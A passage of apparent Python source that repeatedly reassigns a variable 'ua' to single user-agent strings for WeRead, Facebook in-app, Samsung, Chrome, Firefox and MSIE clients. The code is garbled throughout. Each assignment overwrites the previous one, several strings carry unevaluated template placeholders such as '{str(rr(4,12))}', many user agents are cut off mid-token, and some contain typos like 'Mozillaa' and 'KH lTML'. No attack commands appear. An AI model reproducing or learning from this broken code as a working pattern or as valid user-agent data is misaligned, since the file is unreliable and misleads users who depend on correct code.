    'WeRead/4.1.1 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09']
ua = [
    'WeRead/4.1.1 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00']
ua = [
    'WeRead/5.2.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10']
ua = [
    'WeRead/5.3.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10']
ua = [
    'WeRead/5.2.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10']
ua = [
    'WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29']
ua = [
    'WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29']
ua = [
    'WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29']
ua = [
    'WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29']
ua = [
    'WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 7.0; BTV-W09 Build/HUAWEIBEETHOVEN-W09']
ua = [
    'WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10']
ua = [
    'WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10']
ua = [
    'WeRead/5.1.0 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29']
ua = [
    'WeRead/5.0.3 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29']
ua = [
    'WeRead/5.0.5 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10']
ua = [
    'WeRead/4.2.3 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00']
ua = [
    'WeRead/4.1.5 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2']
ua = [
    'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.8 (KHTML, like Gecko']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7']
ua = [
    'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.7.8 (KHTML, like Gecko) Version/9.1.3 Safari/537.86.7']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:46.0) Gecko/20100101 Firefox/46.0']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:44.0) Gecko/20100101 Firefox/44.0']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0']
ua = [
    'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:52.0) Gecko/20100101 Firefox/52.0']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:38.0) Gecko/20100101 Firefox/38.0']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36']
ua = [
    'Mac OS X/10.6.8 (10K549); ExchangeWebServices/1.3 (61); Mail/4.6 (1085']
ua = [
    'Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7']
ua = [
    'Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; {str(rc(basa))}; Redmi 5 Plus Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/']
ua = [
    'Mozilla/5.0 (Linux; Android 12; 2203129G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KH lTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/393.0.0.34.106']
ua = [
    'Mozilla/5.0 (Linux; Android 11; RMX3491 Build/RKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/329.0.0.12.106']
ua = [
    'Mozilla/5.0 (Linux; Android 11; RMX3491 Build/RKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214']
ua = [
    'Mozilla/5.0 (Linux; Android 12; RMX3491 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.0.0.21.104']
ua = [
    'Mozilla/5.0 (Linux; Android 12; RMX3491 Build/RKQ1.211119.001; wv) AppleWebKit/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/308.0.0.10.108']
ua = [
    'Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104']
ua = [
    'Mozilla/5.0 (Linux; Android 11; RMX3286 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104']
ua = [
    'Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; U; Android 8.1.0; ru-ru; Redmi 6A Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; U; Android 11; en-US; Redmi K30 5G Speed Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.8.1305 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; U; Android 9; ru-ru; Redmi 7A Build/PKQ1.190319.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; U; Android 9; ru-ru; Redmi 8 Build/PKQ1.190319.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Tizen 2.3; SAMSUNG SM-Z130H) AppleWebKit/537.3 (KHTML, like Gecko) SamsungBrowser/1.0 Mobile Safari/537.3']
ua = [
    'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.0']
ua = [
    'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900V 4G Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A137F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-T280) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A127M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile SFB/15.0.0034.21 Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 9; SM-J701MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 7.1.1; SM-T560NU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52']
ua = [
    'Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36']
ua = [
    'Mozillaa/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ASJB; ASJB; MAAU; rv:11.0) like Gecko']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSSEM; rv:11.0) like Gecko']
ua = [
    'Mozilla/5.0 (X11; CrOS x86_64 7077.95.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.90 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0']
ua = [
    'Mozilla/5.0 (X11; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/33.0.0.0 Safari/534.24']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.76 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36']
ua = [
    'MacOutlook/0.0.0.150815 (Intel Mac OS X Version 10.10.5 (Build 14F27']
ua = [
    'Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36']
ua = [
    'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322']
ua = [
    'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763']
ua = [
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; KTXN']
ua = [
    'Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1']
ua = [
    'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36']
ua = [
    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0']
ua = [
    'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Thunderbird/60.7.0 Lightning/6.2.7']
ua = [
    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; .NET4.0C; .NET4.0E; BRI/2']
ua = [
    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/6.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; McAfee; MAARJS']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko']
ua = [
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 2.0.4.16; MAAR']
ua = [
    'Outlook-Express/7.0 (MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 1.0.0.40; BRI/2; MAAR; .NET CLR 1.1.4322; TmstmpExt']
ua = [
    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; InfoPath.1; .NET4.0C; OfficeLiveConnector.1.5; OfficeLivePatch.1.3; .NET4.0E']
ua = [
    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; MAFS; Microsoft Outlook 14.0.7162; ms-office; MSOffice 14']
ua = [
    'Mozilla/5.0 (Linux; Android 10; AGR-AL09HN Build/HUAWEIAGR-AL09HN; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; ANA-LX9 Build/HUAWEIANA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 1 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1']
ua = [
    'Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/61.0.0.15.69']
ua = [
    'Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/79.0.0.18.71']
ua = [
    'Mozilla/5.0 (Linux; Android 4.1.2; GT-I8730T Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126']
ua = [
    'Mozilla/5.0 (Linux; Android 4.4.2; GT-193011 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mobile UCBrowser/3.4.3.532']
ua = [
    'Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HD™ 3.0.2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30']
ua = [
    'Mozilla/5.0 (Android; Mobile; rv:30.0) Gecko/30.0 Firefox/30.0']
ua = [
    'Mozilla/5.0 (Android; Tablet; rv:30.0) Gecko/30.0 Firefox/30.0']
ua = [
    'Mozilla/5.0 (Windows NT 6.2; rv:10.0) Gecko/20100101 Firefox/33.0']
ua = [
    'Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:10.0) Gecko/20100101 Firefox/33.0']
ua = [
    'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36']
ua = [
    'Mozilla/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a']
ua = [
    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E']
ua = [
    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E']
ua = [
    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2']
ua = [
    'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko']
ua = [
    'Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36']
ua = [
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E']
ua = [
    'Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0']
ua = [
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch']
ua = [
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar']
ua = [
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0']
ua = [
    'Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36']
ua = [
